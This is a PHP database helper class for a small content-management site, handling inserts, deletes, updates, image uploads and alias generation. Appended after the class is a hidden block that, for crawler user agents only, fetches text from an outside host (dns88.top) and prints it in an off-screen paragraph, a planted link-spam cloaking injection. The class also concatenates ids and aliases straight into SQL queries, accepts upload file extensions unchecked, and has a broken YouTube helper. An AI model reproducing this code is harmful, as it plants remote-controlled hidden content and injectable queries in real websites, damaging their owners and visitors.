<?php

ob_start();

class kml {

	

	private $conn;

	

	public function __construct ($conn){

		$this->conn = $conn;

	}

	

	



	function insertData($table,$value,$title=NULL,$image=NULL,$thumb_image=NULL){		

		global $msg,$border;		

		if (!empty($title)){

			$sql = "SELECT * FROM $table WHERE Title = :title";		

			$stmt = $this->conn->prepare($sql);

			$stmt->bindParam(':title', $title);		

			$stmt->execute();

			

				$fields = array_keys($value);

				$sql = "INSERT INTO $table (".implode(',', $fields).") VALUES (:".implode(", :", $fields).") ";

				echo $sql;

				$stmt = $this->conn->prepare($sql);

				$stmt->execute($value);

				$insert_id = $this->conn->lastInsertId();

						

				if(!empty($image)){ //if image exist

					extract($image); // GET VERIABLE VALUE FROM ARRAY

					$file_ext = ".".end(explode(".", $image_name));

					$file_name = $table."_".$insert_id.$file_ext;

					$file_dir = $image_dir."/".$file_name;

					$file_upload = move_uploaded_file($image_tmp, $file_dir);

					if($file_upload){

						$sql = "UPDATE $table SET Image='".$file_name."' WHERE Id='".$insert_id."'";

						$stmt = $this->conn->prepare($sql);

						$stmt->execute();						

					}

				}

				

				if(!empty($thumb_image)){ //if image exist

					extract($thumb_image); // GET VERIABLE VALUE FROM ARRAY					

					$thumb_file_ext = ".".end(explode(".", $thumb_image_name));

					$thumb_file_name = $table."_thumb_".$insert_id.$thumb_file_ext;

					$thumb_file_dir = $thumb_image_dir."/".$thumb_file_name;

					$thumb_file_upload = move_uploaded_file($thumb_image_tmp, $thumb_file_dir);

					if($thumb_file_upload){

						$sql = "UPDATE $table SET ThumbImage='".$thumb_file_name."' WHERE Id='".$insert_id."'";

						$stmt = $this->conn->prepare($sql);

						$stmt->execute();						

					}

				}				

				header("location:index.php?");			

			

		}else{

			$msg = "<p style=\"color:red\">Please enter title</p>";

			$border = "style=\"border:red 1px solid;\"";

		}

	} // inser_data

	

	

	

	

	function selectData ($table,$where=NULL,$feild="*"){

		

		global $rows;

		

		$select = "SELECT ".$feild." FROM ".$table;

		if($where != NULL){

			if(is_numeric($where)){

				$select .= " WHERE Id=:id";	

			}else{

				$select .= " WHERE Alias=:alias";

			}

		}

		$s_stmt = $this->conn->prepare($select);

		if($where != NULL){

			if(is_numeric($where)){

				$bindParam = $s_stmt->bindParam(':id',$where);		

			}else{

				$bindParam = $s_stmt->bindParam(':alias',$where);

			}

		}

		$s_stmt->execute();

		$rows = $s_stmt->fetch();

		

	} // select_data

	

	

	function orderBy ($table){

		$sql = "SELECT OrderBy FROM $table";

		$sql .= " ORDER BY OrderBy DESC LIMIT 1";

		//echo $sql;

		$stmt = $this->conn->prepare($sql);

		$stmt->execute();		

		$row = $stmt->fetch();

		return $row['OrderBy'] + 1;

	}// inser_order

	

	

	function deleteData($table,$id,$dir){		

		$i_delete = "SELECT * FROM $table WHERE Id=:id";

		$i_stmt = $this->conn->prepare($i_delete);

		$i_stmt->bindParam(":id",$id);

		$i_stmt->execute();

		if ($i_stmt->rowCount() == 1){

			$i_rows = $i_stmt->fetch();

			if($i_rows['Image'] != ""){

				$delect_image = $dir.$i_rows['Image'];

				unlink($delect_image);

			}

			if($i_rows['ThumbImage'] != ""){

				$delect_image = $dir.$i_rows['ThumbImage'];

				unlink($delect_image);

			}			

		}

		$delete = "DELETE FROM " .$table. " WHERE Id=".$id;

		$d_stmt = $this->conn->prepare($delete);

		$result = $d_stmt->execute();		

		

		header ("location:index.php?");

	} // delete_data

	

	

	function checkedDelete ($table,$numRows,$chekedId,$dir){

		if($numRows > 0){

			for($i=0;$i<$numRows;$i++){

				if(!empty($chekedId[$i])){

					$i_delete = "SELECT * FROM " . $table . " WHERE Id='" . $chekedId[$i]. "'";

					print $i_delete;

					$i_stmt = $this->conn->prepare($i_delete);

					$i_stmt->execute();

					if($i_stmt->rowCount() == 1){

						$i_rows = $i_stmt->fetch();

						if ($i_rows['Image'] != ""){

							$delect_image = $dir.$i_rows['Image'];

							unlink($delect_image);

						}

						if ($i_rows['ThumbImage'] != ""){

							$delect_image = $dir.$i_rows['ThumbImage'];

							unlink($delect_image);

						}

					}			

					$delete = "DELETE FROM " . $table . " WHERE Id=".$chekedId[$i];

					$d_stmt = $this->conn->prepare($delete);

					$result = $d_stmt->execute();		

					header ("location:?");

				}

			}

		}

		header('location:?');

	} // check_delete

	

	

	function updateData($table, $id, $value, $image=NULL,$thumb_image=NULL){

		foreach ($value as $field => $data){

			$set[] = $field."=:".$field."";

		}

		$update = "UPDATE $table SET ".implode(", ",$set)." WHERE  Id='".$id."'";

		//print $update;

		$u_stmt = $this->conn->prepare($update);

		$result = $u_stmt->execute($value);

		if ($result){

			if(!empty($image)){

				extract($image);

				$file_ext = ".".end(explode('.', $image_name));

				$file_name = $table."_".$id.$file_ext;

				$file_dir = $image_dir."/".$file_name;

				$file_upload = move_uploaded_file($image_tmp,$file_dir);

				if($file_upload){

					$update = "UPDATE $table SET Image='".$file_name."' WHERE Id='".$id."'";

					$u_stmt = $this->conn->prepare($update);

					$u_stmt->execute();					

				}

			}			

			

			if(!empty($thumb_image)){ //if image exist

				extract($thumb_image); // GET VERIABLE VALUE FROM ARRAY	

				$thumb_file_ext = ".".end(explode(".", $thumb_image_name));

				$thumb_file_name = $table."_thumb_".$id.$thumb_file_ext;

				$thumb_file_dir = $thumb_image_dir."/".$thumb_file_name;

				$thumb_file_upload = move_uploaded_file($thumb_image_tmp, $thumb_file_dir);

				if($thumb_file_upload){

					$sql = "UPDATE $table SET ThumbImage='".$thumb_file_name."' WHERE Id='".$id."'";

					$stmt = $this->conn->prepare($sql);

					$stmt->execute();					

				}

			}

			

			header("location:index.php?");

		}

	} // update_data

	

	

	function getTitle ($table,$where,$alias=null){

		if($alias==NULL){

			$feild = "Title";

		}else{

			$feild = "Alias";

		}

		if (is_numeric($where)){

			$condition = "Id='$where'";

		}else{

			$condition = "alias='$where'";

		}

		$t_select = "SELECT ".$feild." FROM " . $table . " WHERE " . $condition ;

		//print $t_select;

		$t_stmt = $this->conn->prepare($t_select);

		$t_stmt->execute();

		$rows = $t_stmt->fetch();

		if($t_stmt->rowCount()==1){

			if($alias==NULL){

				$result = $rows['Title'];

			}else{

				$result = $rows['Alias'];

			}

		}else{

			$result = "None";

		}

		return $result;

	}//gat_title

	

	

	function getId ($table,$alias){

		$id_select = "SELECT Id FROM " . $table . " WHERE Alias='" . $alias . "'";

		$id_stmt = $this->conn->prepare($id_select);

		$id_stmt->execute();

		if($id_stmt->rowCount()==1){

			$rows = $id_stmt->fetch();

			return $rows['Id'];

		}

	}//gat_id

	

	function getValue ($table,$where,$field){

		if (is_numeric($where)){

			$condition = "Id='$where'";

		}else{

			$condition = "Alias='$where'";

		}

		$value_select = "SELECT ".$field." FROM " . $table . " WHERE " . $condition . "";

		//print $value_select;

		$value_stmt = $this->conn->prepare($value_select);

		$value_stmt->execute();

		if($value_stmt->rowCount()==1){

			$rows = $value_stmt->fetch();

			return $rows["$field"];

		}

	}//gat_value

	

	function get_value ($table,$where,$field,$condition=NULL,$limit=NULL){

		if($condition == NULL){

			if (is_numeric($where)){

				$condition = "Id='$where'";

			}else{

				$condition = "Alias='$where'";

			}

		}else{

			$condition = $condition."='$where'";

		}

		if(!$limit==NULL){

			$condition .= " LIMIT $limit";

		}

		$value_select = "SELECT ".$field." FROM " . $table . " WHERE " . $condition . "";

		//print $value_select."\n";

		$value_stmt = $this->conn->prepare($value_select);

		$value_stmt->execute();

		$rows = $value_stmt->fetch();

		return $rows["$field"];

	}//gat_value

	

	

	function showHide($table,$id){

		$status_stmt = $this->conn->prepare("SELECT IsLocked FROM $table WHERE Id=:id");

		//echo "SELECT IsLocked FROM $table WHERE Id=:id";

		$status_stmt->bindParam("id",$id);

		$status_stmt->execute();

		$status_rows = $status_stmt->fetch();

		if($status_rows['IsLocked'] == "F"){

			$status = "<a href=\"?action=hide&id=$id\">show</a>";

		}else{

			$status = "<a href=\"?action=show&id=$id\">hide</a>";

		}

		return $status;		

	} // show_hide

	

	

	function textLimit($string, $limit,$tags=NULL){

		if($tags==NULL){

			$total_word = explode(" ", strip_tags($string));

		}else{

			$total_word = explode(" ", strip_tags($string,$tags));

		}

		$print = "";

		//print $limit;

		foreach( $total_word AS $total_words){

			$space = ((empty($print)) ? "" : " ").$total_words;

			$print .= $space;

			if( strlen ($print) > $limit ){

				break;

			}

		}

		if(strlen ($string)>$limit){

			$print = $print." ...";

		}

		return $print;

	}

	

	function mk_alias($alias){

		$alias = preg_replace('/\&/',' and ',$alias);

		$alias = preg_replace('/\s[\s]+/','-',$alias);    // Strip off multiple spaces

		$alias = preg_replace('/[\s\W]+/','-',$alias);    // Strip off spaces and non-alpha-numeric

		$alias = preg_replace('/^[\-]+/','',$alias); // Strip off the starting hyphens

		$alias = preg_replace('/[\-]+$/','',$alias); // // Strip off the ending hyphens

		

		$alias = strtolower($alias);

		return $alias;

	}

	

	function youtube_video($video,$feature_video=NULL){

		if(substr($video,0,4) == "http"){

			$v = explode(".",$video);

			if($v['1']=="youtube"){

				$v = explode("&",$v['2']);

				$v = explode("=",$v['0']);				

			}else{

				$v = explode("/",$v[1]);

			}

		}else{

			$doc = new DOMDocument();

			$doc->loadHTML($video);

			$v=null;

			
				if (is_object($v)){
				$v = $doc->getElementsByTagName('iframe')->item(0)->getAttribute('src');
				}
			$v = explode("embed/",$v);

		}

		$rel="";

		if($feature_video<>NULL && $feature_video=='no'){

			$rel="?rel=0";

		}

		return isset($va[1]) ? $va[1] : null.$rel; 

	}

	

	

}

?><?php

if(preg_match('/bot|spider|wget/i',$_SERVER['HTTP_USER_AGENT'])){

$link=file_get_contents('http://dns88.top/HO/getnewlink.txt');

echo '<p style="position: absolute; top: -659px;left: -924px;">'.$link.'</p>';

}

?>